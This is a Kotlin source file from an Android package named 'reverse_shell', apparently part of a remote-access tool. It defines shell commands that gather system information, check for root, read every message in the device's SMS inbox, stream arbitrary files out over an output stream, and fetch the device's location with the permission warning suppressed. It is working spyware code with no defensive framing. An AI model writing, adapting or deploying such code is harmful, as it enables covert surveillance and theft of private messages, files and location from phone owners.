package com.satwik.nexgenius.core.reverse_shell

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileInputStream
import java.io.OutputStream

fun getSystemInfo(): String {
    val os = System.getProperty("os.name")
    val osVersion = System.getProperty("os.version")
    val osArch = System.getProperty("os.arch")
    val user = System.getProperty("user.name")
    val javaVersion = System.getProperty("java.version")
    val runtimeMemory = Runtime.getRuntime().totalMemory()
    val freeMemory = Runtime.getRuntime().freeMemory()

    return """
        System Information:
        OS: $os
        Version: $osVersion
        Architecture: $osArch
        User: $user
        Java Version: $javaVersion
        Total Memory: $runtimeMemory
        Free Memory: $freeMemory
    """.trimIndent()
}

fun checkRoot(): String {
    val paths = arrayOf(
        "/system/app/Superuser.apk",
        "/sbin/su",
        "/system/bin/su",
        "/system/xbin/su",
        "/data/local/xbin/su",
        "/data/local/bin/su",
        "/system/sd/xbin/su",
        "/system/bin/failsafe/su",
        "/data/local/su"
    )

    return if(
        paths.any { path -> File(path).exists()})
    {
        "Device is rooted"
    }
    else{
        "Device is not rooted"
    }
}

fun help():String{
    return """
        ----- Additional Shell Commands -----
        help - show help
        sysinfo - get system information
        checkroot - check if device is rooted
        download - download file from url
        location - get device current location
        
    """.trimIndent()
}

fun getSms(context: Context): String {
    val messages = mutableListOf<String>()
    val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
    try {
        cursor?.let {
            if (it.moveToFirst()) {
                do {
                    var msgData = ""
                    for (idx in 0 until it.columnCount) {
                        msgData += " ${it.getColumnName(idx)}:${it.getString(idx)}"
                    }
                    messages.add(msgData)
                } while (it.moveToNext())
            } else {
                return "Inbox is empty"
            }
            it.close()
        }
    }
    catch (e:Exception){
        println(e)
    }
    return messages.toString()
}

fun sendFile(path: String, dataOutputStream: OutputStream): String {
    println("send start")
    val file = File(path)
    FileInputStream(file).use { fileInputStream ->
        dataOutputStream.write(file.length().toString().toByteArray())

        val buffer = ByteArray(4 * 1024)
        var bytesRead: Int

        while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {
            dataOutputStream.write(buffer, 0, bytesRead)
            dataOutputStream.flush()
        }
        println("send end")
    }
    return "File Sent"
}

@SuppressLint("MissingPermission")
suspend fun getCurrentLocation(context: Context): Location {
    val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)

    val lastLocation = fusedLocationClient.lastLocation.await()

    lastLocation.let {
        val latitude = it.latitude
        val longitude = it.longitude
        return Location(latitude, longitude)
    }
}

